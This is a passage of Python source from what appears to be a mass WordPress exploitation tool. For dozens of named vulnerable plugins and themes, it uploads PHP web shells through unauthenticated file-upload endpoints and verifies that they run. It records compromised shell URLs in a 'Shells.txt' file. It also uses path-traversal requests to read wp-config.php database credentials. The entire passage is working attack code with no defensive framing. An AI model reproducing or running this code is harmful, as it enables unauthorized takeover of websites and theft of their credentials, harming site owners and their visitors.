			xshell_path = re.findall("uname(.*?)/uname",showbizlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/showbiz/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Showbiz     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# 4 . Reflex Gallery
		
		Reflexup = {'qqfile' : (filenames, shell_2, 'text/html')}
		
		Reflexreq = requests.post(url+'/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2018&Month=03', files=Reflexup)
		
		Reflexlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames+'?bang')
		
		
		if 'Bigbang' in Reflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Reflex Gallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Reflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Reflex Gallery     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		
		# 5 .  Wysija
		
		Wysijaup = {'my-theme':open('../../tool/Master.zip', 'rb')}
		
		
		Wysijaapp = {'action':'themeupload',
				   'submitter':'Upload',
				   'overwriteexistingtheme':'on',
				   'page':'GZNeFLoZAb'}
				   
				   
		Wysijareq = requests.post(url+'/wp-admin/admin-post.php?page=wysija_campaigns&action=themes' , data=Wysijaapp, files=Wysijaapp)
		
		Wysijalib = requests.get(url+'/wp-content/uploads/wysija/themes/Master/RxR.php?bang')
		
		
		if 'Bigbang' in Wysijalib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wysija     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Wysijalib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpresshell.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/RxR.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/wysija/themes/Master/RxR.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wysija     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		banGravlib = requests.get(url+'/shell.php')		
		banxxGravlib = requests.get(url+'/wp-content/error.php')
		banxxxGravlib = requests.get(url+'/wp-content/shell.php')
		banxxxxGravlib = requests.get(url+'/wp-admin/shell.php')
		banxxxxxGravlib = requests.get(url+'/098.php')
		
		
		if 'Uname' in banGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/error.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-admin/shell.php'+'\n')
			sys.exit()
		elif 'Uname' in banxxxxxGravlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/098.php'+'\n')
			sys.exit()			
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Shell     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		
		
		# 6 . LearnDash
		
		
		
		LearnDashup={'uploadfiles[]': (filenamex, shell, 'text/html')}
		
		
		LearnDashreq = requests.post(url, files=LearnDashup,data = {'post':'foobar','course_id':'foobar','uploadfile':'foobar'})
		
		
		LearnDashlib = requests.get(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.'))
		
		
		
		if 'izocin' in LearnDashlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} LearnDash     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/assignments/'+filenamex.replace('.php.php', '.php.')+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} LearnDash    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
		
		
		# 7 . Tevolution
		
		
		Tevoup = {'file':(filenames, shell, 'text/html')}
		
		Tevoreq = requests.post(url+'/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php', files=Tevoup)
		
		Tevorlib = requests.get(url+'/wp-content/themes/Directory/images/tmp/'+filenames)
		
		if 'izocin' in Tevorlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Tevolution     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/Directory/images/tmp/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Tevolution    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		
		
		# 7 . pagelines
		
		PostData = {'settings_upload': "settings", 'page': "pagelines"}
		
		zTevoup = {'file':(filenames, shell, 'text/html')}
		
		zTevoreq = requests.post(url+'/wp-admin/admin-post.php', files=zTevoup, data=PostData, headers=Agent)
		
		zTevorlib = requests.get(url+'/wp-content/'+filenames)
		
		if 'izocin' in zTevorlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pagelines     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pagelines    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		
		# 8 . Cherry
		
		Cherryup = {'file':(filenames, shell, 'text/html')}
		
		Cherryreq = requests.post(url+'/wp-content/plugins/cherry-plugin/admin/import-export/upload.php', files=Cherryup)
		
		Cherrylib = requests.get(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames)
		
		
		if 'izocin' in Cherrylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Cherry     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/cherry-plugin/admin/import-export/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Cherry    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		


		
		# 9 . rev
		
		revlib = requests.get(url+"/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Config     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Config     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		


		# 9 . rev
		
		revlib = requests.get(url+"/wp-content/plugins/wp-e-commerce/wpsc-includes/misc.functions.php?image_name=../../../wp-config.php")
				
		if 'DB_USER' in revlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wp-ecommerce Config     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Wp-ecommerce Config     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
		
		# 10 . property
		
		propertyup = {'Filedata':(filenames, shell, 'text/html')}
		
		propertyreq = requests.post(url+'/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php', files=propertyup)
		
		propertylib = requests.get(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames)
		
		
		if 'izocin' in propertylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-property     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/wp-property/third-party/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-property    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 11 . simple
		
		mzoo = {'action': 'upload_ad_imag', 
				'path': ''}
		
		simpleup = {'uploadfile':(filenames, shell, 'text/html')}
		
		simplereq = requests.post(url+'/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php',data=mzoo, files=simpleup)
		
		simplelib = requests.get(url+'/wp-content/plugins/simple-ads-manager/'+filenames)
		
		
		if 'izocin' in simplelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} ads-manager     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/simple-ads-manager/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} ads-manager    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			

		# 12 . simple
		
		dayi = {'file_field': (filevid, shell_2, 'text/html')}

		dayireq = requests.post(url+'/wp-content/plugins/dzs-videogallery/admin/upload.php', files=dayi)

		
		
		dayilib = requests.get(url+"/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx?bang")
		
		
		if 'Bigbang' in dayilib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} dzs-videogallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",dayilib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/Wrdpresshell.txt', 'a').write(url+'/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/dzs-videogallery/admin/upload/izo.PhP.txtx'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} dzs-videogallery    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 13 . simple			
			
		basbe = {'value': './'}
		
		sabo = {'uploadfile': (filecl, shell, 'text/html')}

		sonreq = requests.post(url+'/wp-content/themes/clockstone/theme/functions/uploadbg.php', files=sabo, data=basbe)

		
		
		sonlib = requests.get(url+"/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php")
		
		
		if 'izocin' in sonlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} clackstone     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/clockstone/theme/functions/e3726adb9493beb4e8e2dabe65ea10ef.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} clackstone    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 14 . eptonic
		
		eptonicup = {'qqfile':(filenames, shell, 'text/html')}
		
		eptonicreq = requests.post(url+'/wp-content/themes/eptonic/functions/jwpanel/scripts/valums_uploader/php.php', files=eptonicup)
		
		eptoniclib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in eptoniclib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} eptonic     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} eptonic    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 15 . saico
		
		saicoup = {'qqfile':(filenames, shell, 'text/html')}
		
		saicoreq = requests.post(url+'/wp-content/themes/saico/framework/_scripts/valums_uploader/php.php', files=saicoup)
		
		saicolib = requests.get(url+'/wp-content/uploads/2018/038/'+filenames)
		
		
		if 'izocin' in saicolib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} saico     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} saico    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 16 . saico
		
		barclaycartup = {'Filedata':(filenames, shell, 'text/html')}
		
		barclaycartreq = requests.post(url+'/wp-content/plugins/barclaycart/uploadify/uploadify.php', files=barclaycartup)
		
		barclaycartlib = requests.get(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames)
		
		
		if 'izocin' in barclaycartlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} barclaycart     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/barclaycart/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} barclaycart    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 17 . sexy
		
		sexyup = {'files[]':(filenames, shell, 'text/html')}
		
		sexyreq = requests.post(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', files=sexyup)
		
		sexylib = requests.get(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames)
		
		
		if 'izocin' in sexylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} sexy-contact-form     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/sexy-contact-form/includes/fileupload/files/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} sexy-contact-form    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 18 . pinboard
		
		pinboardup = {'Filedata':(filenames, shell, 'text/html')}
		
		pinboardreq = requests.post(url+'/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1', files=pinboardup)
		
		pinboardlib = requests.get(url+'/wp-content/themes/pinboard/uploads/'+filenames)
		
		
		if 'izocin' in pinboardlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pinboard     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/pinboard/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pinboard    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 19 . pitchprint
		
		pitchprintup = {'files[]':(filenames, shell, 'text/html')}
		
		pitchprintreq = requests.post(url+'/wp-content/plugins/pitchprint/uploader/', files=pitchprintup)
		
		pitchprintlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in pitchprintlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pitchprint     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pitchprint    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 20 . evolve
		
		evolveup = {'qqfile':(filenames, shell, 'text/html')}
		
		evolvereq = requests.post(url+'/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php', files=evolveup)
		
		evolvelib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in evolvelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} evolve     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} evolve    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 21 . satoshi
		
		satoshiup = {'Filedata':(filenames, shell, 'text/html')}
		
		satoshireq = requests.post(url+'/wp-content/themes/satoshi/functions/upload-handler.php', files=satoshiup)
		
		satoshilib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in satoshilib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} satoshi     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} satoshi    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 22 . dandelion
		
		dandelionup = {'qqfile':(filenames, shell, 'text/html')}
		
		dandelionreq = requests.post(url+'/wp-content/themes/dandelion/functions/upload-handler.php', files=dandelionup)
		
		dandelionlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in dandelionlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} dandelion     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} dandelion    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
		# 23 . highlight
		
		highlightup = {'file':(filenames, shell, 'text/html')}
		
		highlightreq = requests.post(url+'/wp-content/themes/highlight/lib/utils/upload-handler.php', files=highlightup)
		
		highlightlib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in highlightlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} highlight     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} highlight    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

			
		# 24 . ithemes
		
		ithemesup = {'Filedata':(filenames, shell, 'text/html')}
		
		ithemesreq = requests.post(url+'/wp-content/themes/ithemes2/themify/themify-ajax.php?upload=1', files=ithemesup)
		
		ithemeslib = requests.get(url+'/wp-content/themes/ithemes2/uploads/'+filenames)
		
		
		if 'izocin' in ithemeslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} ithemes2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/ithemes2/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} ithemes2    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

			
		# 25 . custom-background
		
		customup = {'Filedata':(filenames, shell, 'text/html')}
		
		customreq = requests.post(url+'/wp-content/plugins/custom-background/uploadify/uploadify.php', files=customup)
		
		customlib = requests.get(url+'/wp-content/plugins/custom-background/uploadify/'+filenames)
		
		
		if 'izocin' in customlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} custom-background     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/custom-background/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} custom-background    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 25 . custom-background
		
		zxcustomup = {'file':(filenames, shell, 'text/html')}
		
		zxcustomreq = requests.post(url+'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library', files=zxcustomup)
		
		zxcustomlib = requests.get(url+'/wp-content/jssor-slider/jssor-uploads/'+filenames)
		
		
		if 'izocin' in zxcustomlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} jssor-slider     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/jssor-slider/jssor-uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} jssor-slider    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			
			
		# 26 . amplus
		
		amplusup = {'file':(filenames, shell, 'text/html')}
		
		amplusreq = requests.post(url+'/wp-content/themes/amplus/functions/upload-handler.php', files=amplusup)
		
		ampluslib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in ampluslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} amplus     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/04/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} amplus    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
		# 27 . cnhk
		
		cnhkup = {'slideshow':(filenames, shell, 'text/html')}
		
		cnhkreq = requests.post(url+'/wp-content/plugins/cnhk-slideshow/uploadify/uploadify.php', files=cnhkup)
		
		cnhklib = requests.get(url+'/wp-content/plugins/cnhk-slideshow/uploadify/'+filenames)
		
		
		if 'izocin' in cnhklib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} cnhk-slideshow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/cnhk-slideshow/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} cnhk-slideshow    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 28 . asset
		
		assetup = {'Filedata':(filenames, shell, 'text/html')}
		
		assetreq = requests.post(url+'/wp-content/plugins/asset-manager/upload.php', files=assetup)
		
		assetlib = requests.get(url+'/wp-content/uploads/assets/temp/'+filenames)
		
		
		if 'izocin' in assetlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} asset-manager     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/assets/temp/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} asset-manager    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 29 . private-conversation			
			
		yasbe = {'folder': '/test/'}
		
		asabo = {'file': (filenames, shell, 'text/html')}

		sonzreq = requests.post(url+'/wp-content/plugins/wordpress-member-private-conversation/doupload.php', data=yasbe, files=asabo)

		
		
		sonzlib = requests.get(url+'/wp-content/uploads/user_uploads/test/'+filenames)
		
		
		if 'izocin' in sonzlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} private-conversation     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/user_uploads/test/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} private-conversation    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
		# 30 . cubed_v1.2
		
		cubedsup = {'uploadfile':(filenames, shell, 'text/html')}
		
		cubedsreq = requests.post(url+'/wp-content/themes/cubed_v1.2/functions/upload-handler.php', files=cubedsup)
		
		cubedslib = requests.get(url+'/wp-content/uploads/2018/08/'+filenames)
		
		
		if 'izocin' in cubedslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} cubed_v1.2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/08/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} cubed_v1.2    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 31 . flipbook
		
		flipbookup = {'qqfile':(filenames, shell, 'text/html')}
		
		flipbookreq = requests.post(url+'/wp-content/plugins/flipbook/php.php', files=flipbookup)
		
		flipbooklib = requests.get(url+'/wp-includes/fb-images/'+filenames)
		
		
		if 'izocin' in flipbooklib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} flipbook     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-includes/fb-images/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} flipbook    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 32 . flipbook
		
		wpstoreup = {'Filedata':(filenames, shell, 'text/html')}
		
		wpstorereq = requests.post(url+'/wp-content/plugins/wpstorecart/php/upload.php', files=wpstoreup)
		
		wpstorelib = requests.get(url+'/wp-content/uploads/wpstorecart/'+filenames)
		
		
		if 'izocin' in wpstorelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpstorecart     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/wpstorecart/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpstorecart    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 33 . dance
		
		danceup = {'file':(filenames, shell, 'text/html')}
		
		dancereq = requests.post(url+'/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php', files=danceup)
		
		dancelib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in dancelib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} dance-studio     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} dance-studio    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 34 . design
		
		designup = {'Filedata':(filenames, shell, 'text/html')}
		
		designreq = requests.post(url+'/wp-content/themes/u-design/scripts/admin/uploadify/uploadify.php', files=designup)
		
		designlib = requests.get(url+'/wp-content/themes/u-design/scripts/admin/uploadify/'+filenames)
		
		
		if 'izocin' in designlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} u-design     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/u-design/scripts/admin/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} u-design    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 35 . wpshop
		
		wpshopup = {'wpshop_file':(filenames, shell, 'text/html')}
		
		wpshopreq = requests.post(url+'/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload', files=wpshopup)
		
		wpshoplib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in wpshoplib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpshop     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpshop    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 36 . symposium
		
		symposiumup = {'fileToUpload':(filenames, shell, 'text/html')}
		
		symposiumreq = requests.post(url+'/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php', files=symposiumup)
		
		symposiumlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in symposiumlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-symposium     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-symposium    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 37 . formcraft
		
		formcraftup = {'files[]':(filenames, shell, 'text/html')}
		
		formcraftreq = requests.post(url+'/wp-content/plugins/formcraft/file-upload/server/php/', files=formcraftup)
		
		formcraftlib = requests.get(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames)
		
		
		if 'izocin' in formcraftlib.content:
